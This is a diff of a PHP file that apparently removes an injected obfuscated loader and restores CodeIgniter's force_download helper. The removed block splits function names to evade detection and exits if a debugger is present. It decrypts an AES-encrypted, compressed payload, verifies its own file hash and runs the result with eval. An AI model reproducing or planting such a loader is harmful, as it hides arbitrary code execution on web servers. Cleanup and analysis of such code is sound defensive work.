@@ -1,28 +1,143 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_pfnfclxi=('bas'.'e64'.'_de'.'cod'.'e');
-$_wgxtlszo=('gzu'.'nco'.'mpr'.'ess');
-$_ko98h4ur=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_jbxn19r0='chQyyv1m';
-$_pdychc9s='hoCIbR4A';
-$_qwmjtxh8='JoWnjuuoRfw=';
-$_ntjh61nf='XjjGxfCR';
-$_dq4q871k='xM/egJzF';
-$_y5546b12='VPpSheU4';
-$_h9niku22='spQI87/D';
-$_em53hxr9='K1pcLA==';
-$_slff52lj=$_pfnfclxi($_dq4q871k.$_jbxn19r0.$_pdychc9s.$_ntjh61nf.$_qwmjtxh8);
-$_x584o56c=$_pfnfclxi($_y5546b12.$_h9niku22.$_em53hxr9);
-$_yot0ausk=$_pfnfclxi('NMW4js19zKsbb/F2997rkJCCCNnwpJoMAwrtLHD61IIlRmu/XVN5ymxoXzRENqr7qAd0OCphDWBnfgnn1aGXGKoViCBXum9auDWBd+n6ot9L4N7IDZdPnd2Rcmd8dLWtf6yXsttduxftueD0GUPYNg2ZaZzWZzh0jyVn3N9tnLSU3fu9JKoI08JBB5to8shfazqgFCa0xLNKWbVaWYf2ky8rluQC5A309UMFJVJR62k4t8wIP0F6vGUQ60BKEn1wqtQYloSI2ezjNJ6USCN1Q9lXdaHpGuFqkGSiHHRpm/Vl81KCKArIJuLKW9KARoLzXbr2GjfJU/+wsih8D/+QLrt6aC9h48cZOL+2LVWm0qsIswjsG/4/TxoBMXOHwjR6zojwN8vahL6A1AxtaHc9AJzEjopFf3ZXPTozJlrNpP+b3VgW7oORzIlQQkM1NIFM82iRLBfzD3UwFzN3mjqNoimgI2azoGnEeuM/uXCiuXBErBbsb6CEp4ka5dIIgselMP2sPd8Ndkj95FcQbzJl6APkk6fkx28iepEFYt0GOpQUinkpjSRWfwqSkGLCPZ9/eX/CiyECevb/4+Cm1SPk5VsuedLcIkvZ6dd4afgb4Ot4DnPiCB/2QFCWqP1gK0bLxNunikjruXsBCKFJ38Np8GccgQOvxf57bUszM23GkZMJ0Rhi5ekDiCVNezUE7pESKR3JqdwOs6hRUmPv92JbkgqFpyFIRQYi5F1Jl1mPgdQVy29SqRb9JrIgh/8wzazraOq2hYc20nAWssI4tLOgJshHilksxCvJiJb8nd2a6wWu7x2LZnwWdnkVQdvyvkxkYPRAAbq9HGPln2AeNtgwlTWTZyS2Ndiidt1faBL+45jpyx5EBN8zHsX9OSZyVNDsFI6aIbvp3Ho42PJJ15UDO3lrDBEmfzPaaN9T4UXU4vOtziN8hcFIOp968VpLYRnyCsa+k0+PhKjPfkcGiIdbe4tUFsGQNyLnpO7bwB2lYKUZe/GSV4UvNtvZXFgwbgV8');
-$_ifnasdc4=$_ko98h4ur($_yot0ausk,'aes-256-cbc',$_slff52lj,OPENSSL_RAW_DATA,$_x584o56c);
-if($_ifnasdc4===false){exit;}
-$_r4gavdjm=$_wgxtlszo($_ifnasdc4);
-if($_r4gavdjm===false){exit;}
-$_d3cc60zi='a3bee02d9f6fece7c04d83b9f908243717678edcc6e3e068d143f1590e37c13c';
-$_oxtlmimv=@file_get_contents(__FILE__);
-if($_oxtlmimv!==false){
-$_f0jngbqb=str_replace($_d3cc60zi,"0000000000000000000000000000000000000000000000000000000000000000",$_oxtlmimv);
-$_a9nnj4bn=hash("sha256",$_f0jngbqb);
-if($_a9nnj4bn!==$_d3cc60zi){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+if ( ! function_exists('force_download'))
+{
+
+
+
+
+
+
+
+
+
+
+function force_download($filename = '', $data = '', $set_mime = FALSE)
+{
+if ($filename === '' OR $data === '')
+{
+return;
 }
-eval($_r4gavdjm);
+elseif ($data === NULL)
+{
+if ( ! @is_file($filename) OR ($filesize = @filesize($filename)) === FALSE)
+{
+return;
+}
+$filepath = $filename;
+$filename = explode('/', str_replace(DIRECTORY_SEPARATOR, '/', $filename));
+$filename = end($filename);
+}
+else
+{
+$filesize = strlen($data);
+}
+
+$mime = 'application/octet-stream';
+$x = explode('.', $filename);
+$extension = end($x);
+if ($set_mime === TRUE)
+{
+if (count($x) === 1 OR $extension === '')
+{
+
+
+
+return;
+}
+
+$mimes =& get_mimes();
+
+if (isset($mimes[$extension]))
+{
+$mime = is_array($mimes[$extension]) ? $mimes[$extension][0] : $mimes[$extension];
+}
+}
+
+
+
+
+
+
+if (count($x) !== 1 && isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/Android\s(1|2\.[01])/', $_SERVER['HTTP_USER_AGENT']))
+{
+$x[count($x) - 1] = strtoupper($extension);
+$filename = implode('.', $x);
+}
+if ($data === NULL && ($fp = @fopen($filepath, 'rb')) === FALSE)
+{
+return;
+}
+
+if (ob_get_level() !== 0 && @ob_end_clean() === FALSE)
+{
+@ob_clean();
+}
+
+header('Content-Type: '.$mime);
+header('Content-Disposition: attachment; filename="'.$filename.'"');
+header('Expires: 0');
+header('Content-Transfer-Encoding: binary');
+header('Content-Length: '.$filesize);
+header('Cache-Control: private, no-transform, no-store, must-revalidate');
+
+if ($data !== NULL)
+{
+exit($data);
+}
+
+while ( ! feof($fp) && ($data = fread($fp, 1048576)) !== FALSE)
+{
+echo $data;
+}
+fclose($fp);
+exit;
+}
+}
